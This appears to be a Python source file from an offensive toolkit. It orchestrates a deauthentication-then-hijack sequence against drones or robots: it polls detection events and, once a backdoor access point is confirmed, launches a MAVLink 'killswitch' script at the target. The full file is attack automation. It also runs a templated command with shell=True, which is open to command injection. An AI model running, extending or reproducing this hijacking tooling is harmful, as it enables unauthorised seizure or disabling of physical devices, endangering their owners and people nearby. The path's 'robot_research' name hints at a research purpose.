import logging
import subprocess
import time

from ghoststack.config_loader import load_targets, resolve_template
from ghoststack.database import EventStore

logging.basicConfig(level=logging.INFO, format="%(asctime)s - [HIJACK_ORCH] - %(message)s")


class HijackOrchestrator:
    def __init__(self):
        self.store = EventStore()
        self.targets = load_targets()
        self.last_id = 0
        self.hijack_state = "IDLE"

    def run(self):
        logging.info("[*] Starting Hijack Orchestrator...")
        while True:
            time.sleep(2)
            self._poll_db()

    def _poll_db(self):
        try:
            for row in self.store.get_events_after(self.last_id):
                self.last_id = row[0]
                module, event = row[2], row[3]

                if module == "unitree-detect":
                    if "BACKDOOR AP DETECTED" in event and self.hijack_state == "DEAUTHING":
                        logging.info("[!] Backdoor AP confirmed. Initiating MAVLink Hijack...")
                        self.hijack_state = "HIJACKING"
                        cmd = resolve_template(
                            "python3 network_analysis/robot_research/mavlink_killswitch.py {mavlink_broadcast}",
                            self.targets,
                        )
                        subprocess.Popen(cmd, shell=True)

                if module in ("remote-id", "flock-detector") and self.hijack_state == "IDLE":
                    logging.info("[*] Target detected. Ready for Deauth -> Hijack sequence.")

        except Exception as exc:
            logging.error(f"Orchestration error: {exc}")


if __name__ == "__main__":
    HijackOrchestrator().run()
